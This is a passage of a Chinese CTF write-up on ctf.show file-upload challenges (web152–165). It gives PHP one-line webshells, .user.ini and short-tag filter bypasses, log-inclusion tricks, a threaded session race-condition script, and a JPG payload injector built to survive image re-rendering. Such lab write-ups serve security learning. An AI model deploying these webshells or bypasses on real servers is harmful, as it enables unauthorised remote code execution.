class="string">&quot;#result&quot;</span>).<span class="title function_ invoke__">html</span>(<span class="string">&quot;文件上传失败&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>检测写在前端了，写入php一句话木马，修改后缀为png。上传并抓包。修改文件后缀为需要的php后缀，并访问所需目录：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688402955857-f686aac1-0654-4ed7-917d-cfca7ddd6fce.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688402971003-055c2997-e4ed-4ed8-9305-7289cd1bee30.png" alt="image.png"><br>payload：GET：<code>?1=system(&#39;tac ../flag.php&#39;);</code></p><h1 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h1><blockquote><p><a href="https://www.dazhuanlan.com/vip_mmles/topics/1547397">https://www.dazhuanlan.com/vip_mmles/topics/1547397</a> userini</p></blockquote><h3 id="user-ini"><a href="#user-ini" class="headerlink" title="user.ini"></a>user.ini</h3><p>whatweb指纹识别，发现是nginx，而且在upload页面下发现index.php文件。而且很容易上传如php5,phtml等类型文件，但是不解析，需要上传.user.ini，使文件解析。<br>.user.ini里面可以写：让所有文件都包含该文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = <span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688404601489-6ec09a2c-4a79-4083-b328-5d72e5cb6763.png" alt="image.png"><br>然后再上传图片马或者直接上传一句话木马文本即可。<br>上传1.txt内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> (<span class="variable">$_GET</span>[<span class="number">1</span>])(<span class="variable">$_GET</span>[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><p>然后访问upload/index.php并传入payload即可：<br><code>upload/index.php?1=system&amp;2=tac ../fla*</code></p><h1 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h1><p>同153上传.user.ini 然后上传图片马。<br>在前面一题的基础上增加了内容过滤,过滤了php , 可以用大小写来绕过。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688405318328-4eb99034-670a-4fe6-ac18-e23af1e2451d.png" alt="image.png"><br>payload同上题目即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688405482171-89b0dee7-b7a0-4359-b477-396cfe446689.png" alt="image.png"></p><h1 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h1><h3 id="短标签"><a href="#短标签" class="headerlink" title="短标签"></a>短标签</h3><p>上传彻底禁用了php 大小写都不行。<br>还是先上传.user.ini 然后使用短标签，建议使用&lt;?=短标签即可<br>短标签：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;<span class="meta">?&gt;</span> <span class="comment">//short_open_tags=on</span></span><br><span class="line"><span class="meta">&lt;?=</span>(表达式)<span class="meta">?&gt;</span>  等价于 <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (表达式)<span class="meta">?&gt;</span> <span class="comment">//无限制</span></span><br><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;%&gt; <span class="comment">//asp_tags=on php_version &lt; 7</span></span><br><span class="line">&lt;script language=”php”&gt;<span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>; &lt;/script&gt; <span class="comment">//php_vsesion &lt; 7</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.png：<code>&lt;?=system($_GET[1]);</code><br>payload:<code>upload/index.php?1=phpinfo&amp;2=tac ../f*</code></p><h1 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h1><p>经过测试过滤了[ ,可以用{}代替[],其它的步骤和前面几个一致<br>1.png : <code>&lt;?=system($_GET&#123;1&#125;);</code></p><h1 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h1><p>又过滤了;和{<br>1.png <code>&lt;?=(system(&#39;nl ../*.ph*&#39;))?&gt;</code><br>注意使用方式可以省略分号，</p><h1 id="web158、web159"><a href="#web158、web159" class="headerlink" title="web158、web159"></a>web158、web159</h1><p>1.png <code>&lt;?=</code>tac ../f*<code>?&gt;</code></p><h1 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h1><h3 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h3><p>这题将空格和``反引号和log过滤掉了，所以上传的时候要注意略过多余的空格，log可以用点号拼接绕过，且本题不能使用上题的方法。<br>nginx的日志文件在/var/log/nginx/access.log里</p><p>注意这次的.user.ini文件内容是：<br><code>auto_prepend_file=1.png</code>需要将等号两端空格删除<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688446683068-0bcfe710-e681-4a91-aa17-840a2c552880.png" alt="image.png">1.png <code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code><br>按照wp这种写法 会发现提示格式错误。<br>经过查询资料发现，正确的写法应该是：<br>将include和地址中间加一个换行。<br>先用1标记一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688447711896-937e1a62-fa1a-4d66-a9f2-ae783d511c8a.png" alt="image.png"><br>切换到hex部分<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688447786035-2cd193c2-79dd-437c-955c-bf878c13b927.png" alt="image.png"><br>将1改为0d即可上传成功<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688447819911-82544bdd-ea96-40a4-93d5-39096e9badf1.png" alt="image.png"><br>直接访问即可：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688448270283-a83e5567-2d1c-4f82-9ee1-50e690b068d3.png" alt="image.png"> </p><h1 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h1><h3 id="图片头"><a href="#图片头" class="headerlink" title="图片头"></a>图片头</h3><p>加上图片头：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89A</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688480295049-d3bc1e6b-07ae-4e94-99d2-a3445fcc1b94.png" alt="image.png"><br>图片马同理<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688480375207-109baf2b-5e1b-47b9-93ae-a86cc031df77.png" alt="image.png"><br>UA传入一句话木马。</p><h1 id="web162、web163（远程文件包含-这里不复现了-条件竞争需要后半夜-挺不住）"><a href="#web162、web163（远程文件包含-这里不复现了-条件竞争需要后半夜-挺不住）" class="headerlink" title="web162、web163（远程文件包含 这里不复现了 条件竞争需要后半夜 挺不住）"></a>web162、web163（远程文件包含 这里不复现了 条件竞争需要后半夜 挺不住）</h1><p>过滤了<code>.</code>，所以不能利用日志包含了，先正常上传.user.ini<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688481049862-c54f9e2a-74b3-40c2-a695-f853daba81d5.png" alt="image.png"></p><h2 id="方法一-远程文件包含"><a href="#方法一-远程文件包含" class="headerlink" title="方法一 远程文件包含"></a>方法一 远程文件包含</h2><p>因为不能有.所以将IP转换为十进制，然后修改默认为一句话木马。也就是：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688481931827-fd1cc178-4590-4fa9-a4a5-c2f8c1e80c9d.png" alt="image.png"><br>这里由于需要修改默认页面过于麻烦，这里就没有复现。</p><h2 id="方法二-session条件竞争"><a href="#方法二-session条件竞争" class="headerlink" title="方法二 session条件竞争"></a>方法二 session条件竞争</h2><p>利用session.upload_progress将木马写入session文件，然后包含这个session文件。<br>首先在.user.ini包含/tmp/sess_test</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 20.12.5 13:52</span></span><br><span class="line"><span class="comment"># @author:lonmar</span></span><br><span class="line">import io</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;ctf&quot;</span>: <span class="string">&quot;/tmp/sess_test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cmd&quot;</span>: <span class="string">&#x27;system(&quot;tac ../f*&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">write</span>(session):</span><br><span class="line">    <span class="keyword">while</span> event.<span class="title function_ invoke__">isSet</span>():</span><br><span class="line">        f = io.<span class="title function_ invoke__">BytesIO</span>(b<span class="string">&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.<span class="title function_ invoke__">post</span>(<span class="string">&#x27;http://73c8baa3-fd27-4ce6-90d6-107d6eb00f5b.challenge.ctf.show/&#x27;</span>,</span><br><span class="line">                            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">read</span>(session):</span><br><span class="line">    <span class="keyword">while</span> event.<span class="title function_ invoke__">isSet</span>():</span><br><span class="line">        res = session.<span class="title function_ invoke__">post</span>(</span><br><span class="line">            <span class="string">&#x27;http://73c8baa3-fd27-4ce6-90d6-107d6eb00f5b.challenge.ctf.show/&#x27;</span>,</span><br><span class="line">            data=data</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#123;&#x27;</span> in res.text:</span><br><span class="line">            <span class="keyword">print</span>(res.text)</span><br><span class="line">            event.<span class="title function_ invoke__">clear</span>()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;[*]retrying...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.<span class="title function_ invoke__">Event</span>()</span><br><span class="line">    event.<span class="title function_ invoke__">set</span>()</span><br><span class="line">    with requests.<span class="title function_ invoke__">session</span>() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">            threading.<span class="title function_ invoke__">Thread</span>(target=write, args=(session,)).<span class="title function_ invoke__">start</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">            threading.<span class="title function_ invoke__">Thread</span>(target=read, args=(session,)).<span class="title function_ invoke__">start</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是不知道为什么一直也竞争不到。<br>应该是线程的原因，他这个竞争条件只有后半夜才开放。这里就不复现了。</p><h1 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h1><p>使用生成图片马：<br><a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">https://github.com/huntergregal/PNG-IDAT-Payload-Generator</a><br>使用命令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python generate.py -m php -o <span class="number">1</span>.png</span><br></pre></td></tr></table></figure><p>生成的图片文本内容会出现：<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code><br>对应传值。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688889962772-0ebf85cd-590f-41dc-88d7-5d5554df2bf9.png" alt="image.png"><br>下载图片，以文本的格式打开就会发现内容。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688890006709-fa1d6252-3631-4a0a-bd11-062d0f875536.png" alt="image.png"></p><h1 id="web165（傻逼库一直导不进去）"><a href="#web165（傻逼库一直导不进去）" class="headerlink" title="web165（傻逼库一直导不进去）"></a>web165（傻逼库一直导不进去）</h1><h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><p>这次图片上传之后会被二次渲染。<br>可以先将图片渲染一张，然后再写入木马。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688890383585-00cf1a9c-19b5-4f12-bafc-08a45e71214b.png" alt="image.png"><br>二次渲染之后写入木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">See also:</span></span><br><span class="line"><span class="comment">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=eval(\$_POST[7]);?&gt;&quot;</span>; <span class="comment">//注意$转义</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">    <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">    <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">        <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">        <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">        <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">            <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">            <span class="variable">$outStreamTmp</span> =</span><br><span class="line">                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) .</span><br><span class="line">                <span class="variable">$miniPayload</span> .</span><br><span class="line">                <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) .</span><br><span class="line">                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">            <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                <span class="variable">$outStream</span> =</span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) .</span><br><span class="line">                    <span class="variable">$miniPayload</span> .</span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                        <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                        <span class="number">0</span>,</span><br><span class="line">                        <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) .</span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">    <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span 